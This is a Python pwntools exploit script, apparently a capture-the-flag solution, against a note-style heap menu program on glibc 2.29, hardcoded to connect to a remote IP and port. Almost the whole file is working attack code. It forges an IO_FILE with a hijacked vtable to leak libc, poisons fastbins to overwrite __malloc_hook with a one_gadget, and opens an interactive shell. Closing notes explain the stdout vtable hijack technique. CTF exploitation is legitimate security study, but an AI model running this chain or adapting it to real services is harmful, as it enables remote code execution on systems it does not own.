#  Exploitable only when read from stdout is possible(ex.xinetd)

from pwn import *
from IO_FILE import *

###Util
def showname(silent=False,data=None):
    if silent is False:
        r.sendlineafter('choice : ','1')
        return r.recvline()[:-1]
    else:
        r.send('\n'*9)
        r.send('1'.ljust(3,'\x00'))
        r.send(data)

def create(size,data,silent=False):
    if silent is False:
        r.sendlineafter('choice : ','2')
        r.sendafter('Length : ',str(size-4).ljust(3,'\x00'))
        r.sendafter('Content : ',data)
    else:
        r.send('\n'*9)
        r.send('2'.ljust(3,'\x00'))
        r.send('\n'*15)
        r.send(str(size-4).ljust(3,'\x00'))
        r.send('\n'*16)
        r.send(data)

def show(idx,silent=False,data=None):
    if silent is False:
        r.sendlineafter('choice : ','3',timeout=1)
        r.sendlineafter('Page : ',str(idx),timeout=1)
        return r.recvline(timeout=1)[:-1]
    else:
        r.send('\n'*9)
        r.send('3'.ljust(3,'\x00'))
        r.send('\n'*7)
        r.send(str(idx).ljust(3,'\x00'))
        r.send(data)

def edit(idx,data,silent=False):
    r.sendlineafter('choice : ','4')
    r.sendlineafter('Page : ',str(idx))
    r.sendafter('Content : ',data)

def delete(idx,silent=False):
    if silent is False:
        r.sendlineafter('choice : ','5')
        r.sendlineafter('Page : ',str(idx))
    else:
        r.send('\n'*9)
        r.send('5'.ljust(3,'\x00'))
        r.send('\n'*7)
        r.send(str(idx).ljust(3,'\x00'))

###Addr
#  libc2.29(Ubuntu)
stdout_struct_offset = 0x1e5760
stdout_vtable_offset = stdout_struct_offset+0xd8
IO_file_jumps_offset = 0x1e6560
malloc_hook_offset = 0x1e4c30
one_gadget = 0x106ef8

###Exploit
while True:
    try:
        #r = process('./D',env={'LD_PRELOAD':'./libc-2.29.so'})
        r = remote('3.238.50.85',10101)

        r.sendafter('name : ','a'*0x20)
        create(0x18,'M30W')     #0

        heap_addr = u64(showname()[0x20:].ljust(8,b'\x00'))-0x260
        print(hex(heap_addr))

        create(0x80,b'\x00'*0x64+p64(0x21)) #1
        create(0x48,b'\x00'*0x14+p64(0x21)) #2
        create(0x48,b'\x00'*0x14+p64(0x21)) #3
        create(0x80,b'\x00'*0x14+p64(0x21)) #4
        create(0x48,b'\x00'*0x14+p64(0x21)) #5
        create(0x68,b'\x00'*0x14+p64(0x21)) #6

        IO_file = IO_FILE_plus(arch=64)
        stream = IO_file.construct(fileno=1,
                                   lock=heap_addr+0x20000,
                                   wide_data=0x21,
                                   unused2=b'\xff'*20,
                                   vtable=(IO_file_jumps_offset+0x38)&0xff)[0x4:0xd9]
        edit(-8,stream)
        sleep(1)
        delete(4,silent=True)
        showname(data=b'a'*0x20+p64(heap_addr+0x17-4)[:-2],silent=True)
        show(0,data=p8(7),silent=True)
        delete(1,silent=True)
        showname(data=b'a'*0x20+p64(heap_addr+0x278-4)[:-2],silent=True)
        show(0,data=p8(0x21),silent=True)
        showname(data=b'a'*0x20+p64(heap_addr+0x438-4)[:-2],silent=True)
        show(0,data=p8(0x21),silent=True)
        delete(5,silent=True)
        showname(data=b'a'*0x20+p64(heap_addr+0x10-4)[:-2],silent=True)
        show(0,data=p8(7),silent=True)
        showname(data=b'a'*0x20+p64(heap_addr+0x358-4)[:-2],silent=True)
        show(0,data=p8(0x21),silent=True)
        showname(data=b'a'*0x20+p64(heap_addr+0x308-4)[:-2],silent=True)
        show(0,data=p8(0x21),silent=True)
        delete(3,silent=True)
        delete(2,silent=True)
        showname(data=b'a'*0x20+p64(heap_addr+0x310-4)[:-2],silent=True)
        show(0,data=p64(heap_addr+0x270)[:-2],silent=True)
        showname(data=b'a'*0x20+p64(heap_addr+0x280-4)[:-2],silent=True)
        show(0,data=p16((stdout_vtable_offset-0x40+0x8000)&0xffff),silent=True)
        sleep(1)
        create(0x18,'\x00'*(0x18-4),silent=True)    #7
        create(0x18,'\x00'*(0x18-4),silent=True)    #8
        create(0x18,'a'*(0x18-4),silent=True)    #9
        showname(data=b'a'*0x20+p64(heap_addr+0x308-4)[:-2],silent=True)
        show(0,data=p8(0x71),silent=True)
        showname(data=b'a'*0x20+p64(heap_addr+0x278-4)[:-2],silent=True)
        show(0,data=p8(0x71),silent=True)
        delete(6,silent=True)
        showname(data=b'a'*0x20+p64(heap_addr+0x15-4)[:-2],silent=True)
        show(0,data=p8(7),silent=True)
        delete(8,silent=True)
        delete(7,silent=True)
        showname(data=b'a'*0x20+p64(heap_addr+0x310-4)[:-2],silent=True)
        show(0,data=p64(heap_addr+0x350)[:-2],silent=True)
        show(9,data=b'a'*0x14+p32(0xffffffff)+b'a'*0x14+p8(IO_file_jumps_offset&0xff),silent=True)
        IO_file_jumps_addr = u64(show(9)[0x2c:]+b'\x00\x00')
        libc_base = IO_file_jumps_addr-IO_file_jumps_offset
        print(hex(libc_base))
        break
    except:
        r.close()

create(0x68,b'\x00'*0x44+p64(0x71)+p64(libc_base+malloc_hook_offset-0x23))  #10
create(0x68,b'M30W') #11
create(0x68,b'\x00'*0xf+p64(libc_base+one_gadget)) #12

r.sendlineafter('choice : ','2')
r.sendafter('Length : ','1')
r.interactive()

###Notes
#  probe vtable by +0x38
#  xsputs->read (successfully transforms puts(X) into read(stdout,X,strlen(X)))
#	calls lseek after read, no side affect otherwise
#	unwritable regions are traversed, but does not crash(only errno set)
#	successfully runs through printf without crashing(errno set, but whatever)
#	hijack->puts overwriteable area
